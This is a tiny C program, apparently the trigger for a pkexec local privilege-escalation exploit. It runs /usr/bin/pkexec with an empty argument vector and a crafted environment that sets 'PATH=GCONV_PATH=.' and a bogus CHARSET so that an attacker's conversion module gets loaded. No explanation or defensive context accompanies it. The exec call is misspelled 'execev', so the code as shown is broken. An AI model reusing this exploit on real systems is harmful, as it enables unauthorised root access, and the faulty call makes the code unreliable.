#include <unistd.h>

int main() {
    char *argv[] = {NULL};
    char *envp[] = {
        "pwn",
        "TERM=..",
        "PATH=GCONV_PATH=.",
        "CHARSET=FUCKYOU",
        NULL};

    execev("/usr/bin/pkexec", argv, envp);
    return 0;
}



